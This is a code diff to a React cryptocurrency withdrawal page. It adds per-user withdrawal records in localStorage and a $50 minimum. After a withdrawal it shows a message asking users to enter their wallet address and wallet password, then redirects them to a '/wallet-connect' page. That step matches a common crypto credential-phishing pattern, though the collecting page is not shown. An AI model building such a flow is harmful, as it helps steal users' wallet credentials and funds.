@@ -16,6 +16,7 @@ interface Transfer {
   currency: string;
   amount: number;
   date: Date;
+  email: string;
 }
 
 const TransferPage: React.FC = () => {
@@ -58,10 +59,17 @@ const TransferPage: React.FC = () => {
 
       fetchWallets();
 
+      const email = session?.user?.email;
+      if (!email) {
+        console.error("User email not found in session");
+        return;
+      }
+
       const savedWithdrawals = JSON.parse(
-        localStorage.getItem("withdrawals") || "[]"
+        localStorage.getItem("withdrawals") || "{}"
       );
-      setWithdrawals(savedWithdrawals);
+      const userWithdrawals = savedWithdrawals[email] || [];
+      setWithdrawals(userWithdrawals);
     }
   }, [session, selectedCurrency]);
 
@@ -84,13 +92,26 @@ const TransferPage: React.FC = () => {
       return;
     }
 
+    if (amount < 50) {
+      setErrorMessage("Cannot withdraw less than $50");
+      setSuccessMessage("");
+      return;
+    }
+
     try {
       const userId = session?.user?._id;
+      const email = session?.user?.email;
+
+      if (!email) {
+        console.error("User email not found in session");
+        return;
+      }
+
       const response = await fetch(`/api/transfer`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          userid: session?.user?._id || "",
+          userid: userId || "",
         },
         body: JSON.stringify({ userId, currency: selectedCurrency, amount }),
       });
@@ -106,18 +127,33 @@ const TransferPage: React.FC = () => {
       setBalance((prevBalance) => prevBalance - amount);
 
       setSuccessMessage(
-        "Processing your withdrawal. It will be completed within 24 hours."
+        "Processing your withdrawal. Please add wallet address and wallet password"
       );
       setErrorMessage("");
+
+      router.push("/wallet-connect");
 
       const newWithdrawal = {
         currency: selectedCurrency,
         amount,
         date: new Date(),
+        email,
       };
-      const updatedWithdrawals = [...withdrawals, newWithdrawal];
+
+      const existingWithdrawals = JSON.parse(
+        localStorage.getItem("withdrawals") || "{}"
+      );
+      const userWithdrawals = existingWithdrawals[email] || [];
+      const updatedWithdrawals = [...userWithdrawals, newWithdrawal];
+
+      localStorage.setItem(
+        "withdrawals",
+        JSON.stringify({
+          ...existingWithdrawals,
+          [email]: updatedWithdrawals,
+        })
+      );
       setWithdrawals(updatedWithdrawals);
-      localStorage.setItem("withdrawals", JSON.stringify(updatedWithdrawals));
 
       setTimeout(() => {
         setSuccessMessage("Withdrawal successful!");
